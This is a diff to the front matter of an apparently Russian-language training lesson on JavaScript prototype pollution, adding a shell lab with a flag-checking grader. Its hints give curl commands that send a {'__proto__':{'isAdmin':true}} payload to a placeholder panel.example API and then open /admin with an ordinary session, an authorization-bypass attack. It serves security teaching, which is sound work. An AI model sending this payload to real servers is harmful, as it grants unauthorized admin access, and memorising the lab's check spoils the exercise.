@@ -12,6 +12,19 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 38
 summary: "Как через __proto__/constructor загрязнить прототип Object и дойти до DOM-XSS или RCE на сервере."
+lab:
+  kind: shell
+  title: "Практика: prototype pollution → обход авторизации"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Проверь merge: curl -s -X POST https://panel.example/api/settings -H 'Content-Type: application/json' -d '{\"theme\":\"dark\"}'"
+    - "Отправь опасный ключ: -d '{\"__proto__\":{\"isAdmin\":true}}'"
+    - "Загрязнение записывает isAdmin в Object.prototype — свойство появляется у всех объектов."
+    - "Затем открой админку с обычной сессией: curl -s https://panel.example/admin -b 'session=user' > found.txt"
+
 ---
 
 ## Вопрос, с которого всё начинается
